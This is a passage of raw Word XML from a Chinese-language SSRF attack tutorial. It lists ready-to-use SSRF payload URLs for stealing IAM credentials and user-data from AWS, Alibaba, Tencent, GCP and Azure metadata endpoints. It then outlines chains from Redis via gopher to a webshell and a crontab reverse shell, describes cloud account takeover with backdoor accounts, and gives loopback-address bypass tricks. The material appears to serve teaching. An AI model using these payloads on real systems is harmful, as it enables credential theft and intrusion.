        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>接口，获取云实例的临时凭据，进而控制</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>整个云</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>账户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BB0F1C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t xml:space="preserve">[!] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t>如果能拿到云服务</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
        </w:rPr>
        <w:t>，几乎等于直接拿到了云管理权限！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3F648F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>AWS EC2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6101B569" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>=http://169.254.169.254/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199979E7" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE656F4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A2A5C9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>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">=http://169.254.169.254/latest/user-data/    # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>启动脚本，常含密码和密钥</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BECD03" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>拿到临时凭据后，可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> AWS CLI </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>操作该实例授权的所有资源（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>S3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>EC2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">RDS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>等）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CBC062" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>阿里云</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="11A056B5" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://100.100.100.200/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2B0ED5" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>?url=http://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>100.100.100.200/latest/user-data/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E4DA3E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>腾讯云</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039566B3" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://metadata.tencentyun.com/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1591A344" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>Google Cloud</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F313110" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://metadata.google.internal/computeMetadata/v1/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D33DF9E" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A16A210" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">GCP </w:t>
      </w:r>
      <w:r>
        <w:t>需要额外</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Header</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>Metadata-Flavor: Google</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51542EC8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>Azure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259388F2" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F98109" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">Azure </w:t>
      </w:r>
      <w:r>
        <w:t>需要额外</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Header</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>Metadata: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D7F6EF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>六、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>纵深利用链</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D28FF4C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>] "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>是不是还可以，首先访问到内网，看看能不能在服务器上传程序？然后达成远程后门的原理？反弹</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>？还是直接远程操控</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D6E399" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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答</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>完全可以。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>不只是探测内网，它可以从信息收集升级到命令执行。以下是三条典型的纵深利用链：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E62805" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>利用链</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t>Gopher + Redis -&gt; Webshell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369A0D93" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>探测到内网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r>
        <w:t>端口</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (6379) </w:t>
      </w:r>
      <w:r>
        <w:t>开放</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F079E5D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(2) </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gopher </w:t>
      </w:r>
      <w:r>
        <w:t>协议构造</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r>
        <w:t>命令，向</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r>
        <w:t>目录写入</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> webshell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72532714" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>访问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webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，获取服</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>务器权限</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0F2D89" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>利用链</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Gopher + Redis -&gt; Crontab </w:t>
      </w:r>
      <w:r>
        <w:t>反弹</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1052E9F7" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:t>探测到</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r>
        <w:t>端口开放</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E672AF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(2) </w:t>
      </w:r>
      <w:r>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> crontab </w:t>
      </w:r>
      <w:r>
        <w:t>定时任务，执行反弹</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell </w:t>
      </w:r>
      <w:r>
        <w:t>命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECA8821" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(3) </w:t>
      </w:r>
      <w:r>
        <w:t>攻击者监听端口，获取</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD52AAF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>利用链</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SSRF -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>云资源接管</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED36D77" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>访问</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 169.254.169.254</w:t>
      </w:r>
      <w:r>
        <w:t>（云</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:t>接口）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701B4BAA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">(2) </w:t>
      </w:r>
      <w:r>
        <w:t>获取</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IAM </w:t>
      </w:r>
      <w:r>
        <w:t>临时凭据（</w:t>
      </w:r>
      <w:r>
        <w:t>AccessKey + SecretKey + Token</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6232A600" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>使用云厂商</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> CLI </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>工具，操作</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> S3/ECS/RDS </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>等云资源</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4C1747E8" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">(4) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>严重情况：拿到所有用户数据、删除实例、创建后门账户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342E7D6D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>提示</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>攻击之所以威力最大，是因为凭据通常授予很高的权限。一个</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve"> EC2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>实例如果绑定了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve"> S3FullAccess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>角色，拿到了它的临时凭据就等于有了所有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve"> S3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>存储桶的访问权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768E98E2" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>七、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578C1195" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>实际场景中，目标站点通常会有过滤规则。以下是实战中常用的绕过方式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B6828" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">7.1 IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>地址变形</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06279702" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">127.0.0.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的多种写法（绕过基于字符串的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>过滤）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D8DE5A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>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">27.0.0.1        # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>标准写法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D6E622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 xml:space="preserve">localhost        # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>域名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70476C1B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 xml:space="preserve">0x7f000001       # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>十六进制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0B4C21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 xml:space="preserve">2130706433       # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>十进制整数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7485CC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 xml:space="preserve">0177.0.0.1       # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>八进制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643DCE08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 xml:space="preserve">0x7f.0x0.0x0.0x1 # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>混合进制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3215EA8A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>[::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">1]            # IPv6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>本地回环</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0DD37D9D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">0.0.0.0          # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>部分环境等价</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05869C79" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">127.1            # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>简写（省略后两位）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182D766C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8"/>
